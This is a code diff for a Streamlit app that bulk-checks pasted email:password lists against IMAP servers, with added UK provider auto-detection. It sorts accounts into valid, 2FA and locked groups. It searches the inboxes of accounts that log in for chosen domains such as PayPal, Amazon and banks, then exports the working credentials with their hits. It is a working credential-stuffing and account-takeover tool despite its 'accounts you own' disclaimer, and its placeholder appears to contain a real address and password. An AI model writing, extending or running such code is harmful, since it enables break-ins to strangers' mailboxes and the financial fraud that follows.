@@ -21,7 +21,7 @@ if not st.session_state.authenticated:
     st.stop()
 
 # ==================================================
-# 📧 IMAP CHECKER — Inbox Counts + DOMAIN SEARCH IN INBOX + 2FA + Stats
+# 🇬🇧 UK IMAP CHECKER — Accounts + Target Domain Search + All Neat Captures
 # ==================================================
 
 import imaplib
@@ -36,9 +36,9 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 MAX_WORKERS = 8
 TIMEOUT = 15
 DELAY_BETWEEN = 0.1
-MAX_SCAN_EMAILS = 50  # Scan up to 50 most recent emails for domains
+MAX_SCAN_EMAILS = 50  # Scan up to 50 most recent emails
 
-# 🔍 PARSE LINE
+# 🔍 PARSE ACCOUNT LINE
 def parse_line(line):
     line = line.strip()
     if not line or line.startswith("#"):
@@ -53,96 +53,106 @@ def parse_line(line):
         return {"email": match.group(1), "password": match.group(2)}
     return None
 
-# 📡 IMAP SERVER DETECTION
+# 🔍 PARSE TARGET DOMAIN LINE
+def parse_domain_line(line):
+    line = line.strip().lower()
+    if not line or line.startswith("#") or "." not in line:
+        return None
+    line = re.sub(r'^https?://', '', line)
+    line = re.sub(r'^www\.', '', line)
+    line = line.split("/")[0]
+    return line
+
+# 📡 UK PROVIDER AUTO-DETECT
 def get_imap_server(email):
     domain = email.split("@")[-1].lower()
     servers = {
         "gmail.com": ("imap.gmail.com", 993),
         "outlook.com": ("imap-mail.outlook.com", 993),
         "hotmail.com": ("imap-mail.outlook.com", 993),
-        "yahoo.com": ("imap.mail.yahoo.com", 993),
         "yahoo.co.uk": ("imap.mail.yahoo.com", 993),
-        "icloud.com": ("imap.mail.me.com", 993),
+        "yahoo.com": ("imap.mail.yahoo.com", 993),
+        "btinternet.com": ("mail.btinternet.com", 993),
+        "bt.com": ("mail.btinternet.com", 993),
+        "talktalk.net": ("mail.talktalk.net", 993),
+        "sky.com": ("imap.sky.com", 993),
+        "virginmedia.com": ("imap.virginmedia.com", 993),
+        "ntlworld.com": ("imap.ntlworld.com", 993),
+        "blueyonder.co.uk": ("imap.blueyonder.co.uk", 993),
+        "plus.net": ("imap.plus.net", 993),
         "aol.com": ("imap.aol.com", 993),
-        "mail.com": ("imap.mail.com", 993),
-        "protonmail.com": ("127.0.0.1", 1143),
+        "icloud.com": ("imap.mail.me.com", 993),
     }
     return servers.get(domain, ("imap." + domain, 993))
 
-# 📊 EXTRACT DOMAIN FROM EMAIL ADDRESS
+# 📊 EXTRACT DOMAIN FROM EMAIL
 def extract_domain(email_str):
-    """Extract domain from email-like strings"""
     match = re.search(r'@([a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)', str(email_str))
     return match.group(1).lower() if match else None
 
-# 🔎 SCAN INBOX FOR ALL DOMAINS
-def scan_inbox_domains(mail, max_emails=MAX_SCAN_EMAILS):
-    """Scan recent emails and count all unique sender/recipient domains"""
-    domains = Counter()
+# 🔎 SCAN INBOX FOR TARGET DOMAINS
+def scan_inbox_for_domains(mail, target_domains, max_emails=MAX_SCAN_EMAILS):
+    hits = Counter()
     try:
         status, count = mail.select("INBOX", readonly=True)
         if status != "OK":
-            return domains
-        
+            return hits
         total = int(count[0])
-        if total == 0:
-            return domains
-        
-        # Get last N emails (newest first)
+        if total == 0 or not target_domains:
+            return hits
         fetch_count = min(total, max_emails)
         status, data = mail.search(None, "ALL")
         if status != "OK":
-            return domains
-        
+            return hits
         id_list = data[0].split()[-fetch_count:]
         for email_id in id_list:
             try:
-                # Fetch FROM, TO, CC headers only (fast!)
                 status, msg_data = mail.fetch(email_id, "(BODY[HEADER.FIELDS (FROM TO CC)])")
                 if status != "OK":
                     continue
-                for response_part in msg_data:
-                    if isinstance(response_part, tuple):
-                        headers = response_part[1].decode("utf-8", errors="ignore")
-                        # Extract ALL emails from headers
+                for part in msg_data:
+                    if isinstance(part, tuple):
+                        headers = part[1].decode("utf-8", errors="ignore")
                         emails_found = re.findall(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+', headers)
                         for e in emails_found:
                             dom = extract_domain(e)
                             if dom:
-                                domains[dom] += 1
+                                for target in target_domains:
+                                    if target in dom or dom == target:
+                                        hits[target] += 1
             except:
                 continue
     except:
         pass
-    return domains
+    return hits
 
-# 🔎 CHECK FOR 2FA / LOCKED / UNKNOWN
-def check_special_status(exception_msg, email):
-    err = str(exception_msg).lower()
-    if any(kw in err for kw in ["application-specific", "app password", "2fa", "two-factor", "verification", "suspicious", "unusual", "login attempt", "security check"]):
+# 🔒 DETECT 2FA / SECURITY
+def check_special_status(err_msg):
+    err = str(err_msg).lower()
+    if any(k in err for k in ["app password", "2fa", "two-factor", "verification", "suspicious", "unusual", "login attempt", "security check"]):
         return "🔒 2FA / App Password Required"
-    if any(kw in err for kw in ["locked", "disabled", "suspended", "account unavailable", "access denied"]):
+    if any(k in err for k in ["locked", "disabled", "suspended", "account unavailable", "access denied"]):
         return "🚫 Account Locked/Disabled"
-    if any(kw in err for kw in ["too many", "rate limit", "busy", "try again later"]):
+    if any(k in err for k in ["too many", "rate limit", "busy", "try again later"]):
         return "⏳ Rate Limited"
     return None
 
-# 📧 MAIN IMAP CHECK — WITH INBOX DOMAIN SCAN
-def check_imap(account):
+# 📧 MAIN IMAP CHECK
+def check_imap(account, target_domains):
     email = account["email"]
     password = account["password"]
     host, port = get_imap_server(email)
-    domain = extract_domain(email) or "unknown"
-    
+    account_domain = extract_domain(email) or "unknown"
+
     result = {
         "email": email,
         "password": password,
-        "domain": domain,
+        "domain": account_domain,
         "status": "UNKNOWN",
         "note": "",
         "inbox_count": 0,
-        "inbox_domains": {},  # ← ALL DOMAIN HITS IN INBOX
-        "top_domains": "",    # ← Top 5 for display
+        "domain_hits": {},
+        "hit_summary": "",
         "imap_server": host,
         "checked_at": time.strftime("%Y-%m-%d %H:%M:%S")
     }
@@ -150,25 +160,24 @@ def check_imap(account):
     try:
         mail = imaplib.IMAP4_SSL(host, port, timeout=TIMEOUT)
         mail.login(email, password)
-        
-        # 📥 GET INBOX COUNT
+
+        # Get inbox count
         status, count = mail.select("INBOX", readonly=True)
         if status == "OK":
             result["inbox_count"] = int(count[0])
-        
-        # 🔍 SCAN INBOX FOR DOMAIN HITS
-        result["inbox_domains"] = scan_inbox_domains(mail, MAX_SCAN_EMAILS)
-        
-        # Format top 5 domains for display & export
-        top5 = sorted(result["inbox_domains"].items(), key=lambda x: x[1], reverse=True)[:5]
-        result["top_domains"] = ", ".join([f"{d}({c})" for d, c in top5])
-        
+
+        # Scan for target domains
+        if target_domains:
+            result["domain_hits"] = scan_inbox_for_domains(mail, target_domains, MAX_SCAN_EMAILS)
+            hit_parts = [f"{d}:{c}" for d, c in sorted(result["domain_hits"].items(), key=lambda x:x[1], reverse=True)]
+            result["hit_summary"] = ", ".join(hit_parts) if hit_parts else "None"
+
         mail.logout()
         result["status"] = "✅ VALID"
-        result["note"] = f"✅ {result['inbox_count']} emails | Scanned {MAX_SCAN_EMAILS} for domains"
+        result["note"] = f"✅ {result['inbox_count']} emails scanned"
 
     except imaplib.IMAP4.error as e:
-        special = check_special_status(e, email)
+        special = check_special_status(e)
         if special:
             result["status"] = "🔒 2FA / SECURITY"
             result["note"] = special
@@ -190,153 +199,125 @@ def check_imap(account):
     time.sleep(DELAY_BETWEEN)
     return result
 
-# --- PAGE SETUP ---
-st.set_page_config(page_title="📧 IMAP Checker — Inbox Domain Search", layout="wide")
-st.title("📧 IMAP Account Checker — Inbox Counts + INBOX DOMAIN SEARCH + 2FA + Stats")
-st.markdown(f"""
-**Format**: `email:password` — one per line.  
-**New**: Scans inbox for **all domains** found in emails! Shows top domains per account + overall domain hits.  
-**Captures**: ✅ Valid (inbox count + domains) | 🔒 2FA/Security | ❌ Invalid | ❓ Unknown | ⏱️ Timeout  
-*Scans up to **{MAX_SCAN_EMAILS}** most recent emails per account — adjustable in code.*
+# ==================================================
+# 🖥️ PAGE LAYOUT — EXACTLY YOUR SCREENSHOT STYLE
+# ==================================================
+st.set_page_config(page_title="UK IMAP Checker", layout="wide")
+st.title("📧 UK IMAP Checker — Auto-Detect + Inbox Search")
+st.markdown("""
+Auto-detects: **Virgin Media (ntlworld/blueyonder) • BT • TalkTalk • Sky • Plusnet • Outlook • Yahoo UK • Gmail**  
+⚠️ **ONLY for accounts you own or have written permission.**
 """)
-st.info("⚠️ For accounts YOU own only. UK Computer Misuse Act applies.")
 
-# --- INPUT: FILE UPLOAD + PASTE ---
-tab1, tab2 = st.tabs(["📁 Upload TXT File", "📝 Paste Text"])
-accounts = []
+# --- 📝 SECTION 1: ACCOUNTS INPUT ---
+st.subheader("Enter Accounts")
+st.caption("Format: `email:password` — one per line")
+accounts_text = st.text_area(
+    "Accounts",
+    height=180,
+    placeholder="chrisstone063@btinternet.com:Bamfordeg5\nuser@gmail.com:password123",
+    label_visibility="collapsed"
+)
 
-with tab1:
-    st.subheader("Upload Accounts File")
-    uploaded_file = st.file_uploader("Choose your .txt file", type="txt")
-    if uploaded_file:
-        content = uploaded_file.read().decode("utf-8", errors="ignore")
-        lines = content.splitlines()
-        for line in lines:
-            acc = parse_line(line)
-            if acc:
-                accounts.append(acc)
-        st.success(f"✅ Loaded **{len(accounts)}** accounts from file!")
-        with st.expander("Preview accounts"):
-            for a in accounts[:10]:
-                st.code(f"{a['email']}:{a['password']}")
-            if len(accounts) > 10:
-                st.write(f"... and {len(accounts)-10} more")
+# --- 🎯 SECTION 2: TARGET DOMAIN SEARCH ---
+st.subheader("🔍 Search Inbox FOR THESE DOMAINS")
+st.caption("One per line — leave blank to skip domain search")
+domains_text = st.text_area(
+    "Target Domains",
+    height=120,
+    placeholder="paypal.com\namazon.co.uk\nbank.co.uk",
+    label_visibility="collapsed"
+)
 
-with tab2:
-    st.subheader("Paste Accounts Below")
-    input_text = st.text_area(
-        "email:password — one per line",
-        height=200,
-        placeholder="test@gmail.com:pass123\nhello@outlook.com:mypassword"
-    )
-    if input_text:
-        lines = input_text.strip().split("\n")
-        for line in lines:
-            acc = parse_line(line)
-            if acc:
-                accounts.append(acc)
-        if accounts:
-            st.success(f"✅ Parsed **{len(accounts)}** accounts!")
-
-# --- SETTINGS ---
+# --- ⚙️ SETTINGS & START ---
 st.divider()
-col1, col2 = st.columns([2, 1])
+col1, col2 = st.columns([3, 1])
 with col1:
-    max_workers = st.slider("Concurrent Checks", 1, 15, MAX_WORKERS)
+    max_workers = st.slider("Concurrent Checks", 1, 10, MAX_WORKERS)
 with col2:
     start_btn = st.button("🚀 START CHECK", type="primary", use_container_width=True)
 
-# --- RUN CHECKS ---
+# --- 🚀 RUN CHECKS ---
 if start_btn:
+    # Parse accounts
+    accounts = []
+    if accounts_text.strip():
+        for line in accounts_text.strip().split("\n"):
+            acc = parse_line(line)
+            if acc: accounts.append(acc)
+
+    # Parse target domains
+    target_domains = []
+    if domains_text.strip():
+        for line in domains_text.strip().split("\n"):
+            dom = parse_domain_line(line)
+            if dom: target_domains.append(dom)
+        target_domains = list(set(target_domains))  # Deduplicate
+
     if not accounts:
-        st.warning("⚠️ No accounts found! Upload a file or paste some first.")
+        st.warning("⚠️ Enter at least one account first!")
         st.stop()
 
-    total = len(accounts)
-    st.info(f"🔍 Starting check of **{total}** accounts... Scanning inboxes for domains!")
+    # Status summary
+    dom_msg = f" — searching for {len(target_domains)} domain(s)" if target_domains else ""
+    st.info(f"Loaded **{len(accounts)}** account(s){dom_msg}")
 
+    # Run checks
     results_data = []
-    all_inbox_domains = Counter()  # ← GLOBAL: ALL domains across ALL inboxes
     start_time = time.time()
-
     progress_bar = st.progress(0)
-    c1, c2, c3, c4, c5, c6 = st.columns(6)
-    t_m = c1.empty(); v_m = c2.empty(); fa_m = c3.empty(); inv_m = c4.empty(); unk_m = c5.empty(); time_m = c6.empty()
 
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
-        results = list(executor.map(check_imap, accounts))
+        futures = [executor.submit(check_imap, acc, target_domains) for acc in accounts]
+        for idx, fut in enumerate(as_completed(futures)):
+            results_data.append(fut.result())
+            progress_bar.progress((idx + 1) / len(accounts))
 
-        for idx, result in enumerate(results):
-            results_data.append(result)
-            # Aggregate ALL inbox domains across valid accounts
-            if "✅ VALID" in result["status"] and result.get("inbox_domains"):
-                all_inbox_domains.update(result["inbox_domains"])
-            
-            # Live counters
-            valid_count = sum(1 for r in results_data if "✅ VALID" in r["status"])
-            fa_count = sum(1 for r in results_data if "🔒" in r["status"])
-            inv_count = sum(1 for r in results_data if "❌ INVALID" in r["status"] or "❌ FAILED" in r["status"])
-            unk_count = sum(1 for r in results_data if "❓ UNKNOWN" in r["status"] or "⏱️" in r["status"])
-            
-            progress_bar.progress((idx + 1) / total)
-            t_m.metric("Total", idx + 1)
-            v_m.metric("✅ Valid", valid_count)
-            fa_m.metric("🔒 2FA/Sec", fa_count)
-            inv_m.metric("❌ Invalid", inv_count)
-            unk_m.metric("❓ Other", unk_count)
-            time_m.metric("Time", f"{round(time.time() - start_time, 1)}s")
+    # --- 📊 LIVE COUNTERS ---
+    valid = [r for r in results_data if "✅ VALID" in r["status"]]
+    twofa = [r for r in results_data if "🔒" in r["status"]]
+    invalid = [r for r in results_data if "❌ INVALID" in r["status"] or "❌ FAILED" in r["status"]]
+    unknown = [r for r in results_data if "❓ UNKNOWN" in r["status"] or "⏱️" in r["status"]]
 
-    elapsed = round(time.time() - start_time, 1)
-    st.success(f"✅ CHECK COMPLETE — {total} accounts in {elapsed}s")
+    st.success(f"✅ Complete — {len(accounts)} accounts in {round(time.time() - start_time, 1)}s")
+    c1, c2, c3, c4, c5 = st.columns(5)
+    c1.metric("Total", len(results_data))
+    c2.metric("✅ Valid", len(valid))
+    c3.metric("🔒 2FA", len(twofa))
+    c4.metric("❌ Invalid", len(invalid))
+    c5.metric("❓ Unknown", len(unknown))
 
-    # --- 📊 OVERALL ACCOUNT DOMAIN BREAKDOWN ---
+    # --- 📈 DOMAIN BREAKDOWN ---
     st.subheader("📈 Account Domain Breakdown")
     domain_counts = Counter(r["domain"] for r in results_data)
-    domain_valid = Counter(r["domain"] for r in results_data if "✅ VALID" in r["status"])
-    
+    domain_valid = Counter(r["domain"] for r in valid)
     domain_table = [
         {
-            "Domain": domain,
-            "Total Accounts": count,
-            "Valid Accounts": domain_valid.get(domain, 0),
-            "Hit Rate %": f"{round((domain_valid.get(domain, 0)/count)*100, 1)}%"
+            "Domain": d,
+            "Total Accounts": c,
+            "Valid Accounts": domain_valid.get(d, 0),
+            "Hit Rate %": f"{round((domain_valid.get(d,0)/c)*100,1)}%"
         }
-        for domain, count in sorted(domain_counts.items(), key=lambda x: x[1], reverse=True)
+        for d, c in sorted(domain_counts.items(), key=lambda x:x[1], reverse=True)
     ]
     st.dataframe(domain_table, use_container_width=True, hide_index=True)
 
-    # --- 🔍 INBOX DOMAIN SEARCH — BIG NEW FEATURE! ---
-    st.subheader("🔍 ALL DOMAINS FOUND IN INBOXES")
-    if all_inbox_domains:
-        st.info(f"Found **{len(all_inbox_domains)} unique domains** across all scanned inboxes!")
-        
-        # Top 20 overall inbox domains
-        top_overall = sorted(all_inbox_domains.items(), key=lambda x: x[1], reverse=True)[:20]
-        inbox_domain_table = [
-            {"Domain": domain, "Times Found in Emails": count}
-            for domain, count in top_overall
-        ]
-        st.dataframe(inbox_domain_table, use_container_width=True, hide_index=True)
-        
-        # Search filter
-        search_domain = st.text_input("🔍 Search for a specific domain in all inboxes", placeholder="e.g. paypal.com, amazon.co.uk...").strip().lower()
-        if search_domain:
-            st.subheader(f"🔎 Results for: `{search_domain}`")
-            matches = [
-                r for r in results_data
-                if "✅ VALID" in r["status"] and search_domain in r.get("inbox_domains", {})
-            ]
-            if matches:
-                st.success(f"Found in **{len(matches)} accounts**!")
-                for m in matches:
-                    st.code(f"{m['email']}:{m['password']} | 📥 {m['inbox_domains'][search_domain]} emails contain @{search_domain}")
-            else:
-                st.warning(f"No accounts found with `{search_domain}` in scanned inboxes.")
-    else:
-        st.info("ℹ️ No inbox domains scanned — no valid accounts with accessible inboxes.")
+    # --- 🎯 TARGET DOMAIN HITS SUMMARY ---
+    if target_domains and valid:
+        st.subheader("🎯 Target Domain Hits")
+        total_hits = Counter()
+        for r in valid:
+            for d, cnt in r["domain_hits"].items():
+                total_hits[d] += cnt
+        if total_hits:
+            st.info(f"Found target domains in {sum(1 for r in valid if r['domain_hits'])} accounts")
+            hit_table = [{"Domain": d, "Total Emails Found": c} for d, c in sorted(total_hits.items(), key=lambda x:x[1], reverse=True)]
+            st.dataframe(hit_table, use_container_width=True, hide_index=True)
+        else:
+            st.info("No target domains found in scanned inboxes.")
 
     # --- 📋 FULL RESULTS TABLE ---
-    st.subheader("📋 All Results — Per Account Details")
+    st.subheader("📋 All Results")
     st.dataframe(
         results_data,
         column_config={
@@ -345,71 +326,44 @@ if start_btn:
             "domain": "Account Domain",
             "status": "Status",
             "note": "Details",
-            "inbox_count": "📥 Total Emails",
-            "top_domains": "🔍 Top Inbox Domains",
+            "inbox_count": "📥 Inbox Emails",
+            "hit_summary": "🎯 Target Hits",
             "imap_server": "IMAP Server",
             "checked_at": "Checked At"
         },
         use_container_width=True,
-        height=500,
-        column_order=["email","password","domain","status","note","inbox_count","top_domains","imap_server","checked_at"]
+        height=400
     )
 
-    # --- 📥 EXPORT ALL FORMATS ---
-    st.subheader("📥 Export Results — All Formats")
+    # --- 📥 NEAT EXPORTS ---
+    st.subheader("📥 Export Results")
     col_a, col_b, col_c, col_d, col_e = st.columns(5)
 
-    # 1. FULL CSV — includes inbox domains!
+    # Full CSV
     csv_full = StringIO()
-    writer = csv.DictWriter(csv_full, fieldnames=["email","password","domain","status","note","inbox_count","top_domains","imap_server","checked_at"])
+    writer = csv.DictWriter(csv_full, fieldnames=["email","password","domain","status","note","inbox_count","hit_summary","imap_server","checked_at"])
     writer.writeheader()
     writer.writerows(results_data)
-    col_a.download_button(
-        "📂 Full CSV",
-        data=csv_full.getvalue(),
-        file_name=f"imap_full_{time.strftime('%Y%m%d_%H%M%S')}.csv",
-        mime="text/csv",
-        type="primary"
-    )
+    col_a.download_button("📂 Full CSV", data=csv_full.getvalue(), file_name=f"imap_full_{time.strftime('%Y%m%d_%H%M%S')}.csv", mime="text/csv", type="primary")
 
-    # 2. ✅ VALID ONLY — with inbox count + top domains
-    valid_lines = [
-        f"{r['email']}:{r['password']} | 📥 Inbox: {r['inbox_count']} emails | 🔍 Domains: {r['top_domains']} | {r['domain']}"
-        for r in results_data if "✅ VALID" in r["status"]
-    ]
-    col_b.download_button(
-        "✅ Valid + Inbox Domains",
-        data="\n".join(valid_lines),
-        file_name=f"imap_valid_{time.strftime('%Y%m%d_%H%M%S')}.txt",
-        type="secondary"
-    )
+    # ✅ Valid Only — Neat Format
+    valid_txt = "\n".join([
+        f"{r['email']}:{r['password']} | 📥 Inbox: {r['inbox_count']} | 🎯 Hits: {r['hit_summary']} | {r['domain']}"
+        for r in valid
+    ])
+    col_b.download_button("✅ Valid Only", data=valid_txt or "None", file_name=f"imap_valid_{time.strftime('%Y%m%d_%H%M%S')}.txt")
 
-    # 3. 🔒 2FA / SECURITY ONLY
-    fa_lines = [f"{r['email']}:{r['password']} | {r['note']} | {r['domain']}" for r in results_data if "🔒" in r["status"]]
-    col_c.download_button(
-        "🔒 2FA/Security",
-        data="\n".join(fa_lines),
-        file_name=f"imap_2fa_{time.strftime('%Y%m%d_%H%M%S')}.txt",
-        type="secondary"
-    )
+    # 🔒 2FA Only
+    twofa_txt = "\n".join([f"{r['email']}:{r['password']} | {r['note']} | {r['domain']}" for r in twofa])
+    col_c.download_button("🔒 2FA Only", data=twofa_txt or "None", file_name=f"imap_2fa_{time.strftime('%Y%m%d_%H%M%S')}.txt")
 
-    # 4. ❌ INVALID ONLY
-    invalid_lines = [f"{r['email']}:{r['password']} | {r['domain']}" for r in results_data if "❌ INVALID" in r["status"] or "❌ FAILED" in r["status"]]
-    col_d.download_button(
-        "❌ Invalid",
-        data="\n".join(invalid_lines),
-        file_name=f"imap_invalid_{time.strftime('%Y%m%d_%H%M%S')}.txt",
-        type="secondary"
-    )
+    # ❌ Invalid Only
+    invalid_txt = "\n".join([f"{r['email']}:{r['password']} | {r['note']} | {r['domain']}" for r in invalid])
+    col_d.download_button("❌ Invalid Only", data=invalid_txt or "None", file_name=f"imap_invalid_{time.strftime('%Y%m%d_%H%M%S')}.txt")
 
-    # 5. ❓ UNKNOWN / TIMEOUT ONLY
-    other_lines = [f"{r['email']}:{r['password']} | {r['status']} — {r['note']} | {r['domain']}" for r in results_data if "❓ UNKNOWN" in r["status"] or "⏱️" in r["status"] or "⏳" in r["status"]]
-    col_e.download_button(
-        "❓ Unknown/Other",
-        data="\n".join(other_lines),
-        file_name=f"imap_unknown_{time.strftime('%Y%m%d_%H%M%S')}.txt",
-        type="secondary"
-    )
+    # ❓ Unknown Only
+    unknown_txt = "\n".join([f"{r['email']}:{r['password']} | {r['status']} — {r['note']} | {r['domain']}" for r in unknown])
+    col_e.download_button("❓ Unknown Only", data=unknown_txt or "None", file_name=f"imap_unknown_{time.strftime('%Y%m%d_%H%M%S')}.txt")
 
-elif start_btn is False:
-    st.info("👆 Upload a .txt file OR paste your accounts above, then click START CHECK.")
+else:
+    st.info("👆 Enter accounts above, add target domains if needed, then click START CHECK.")
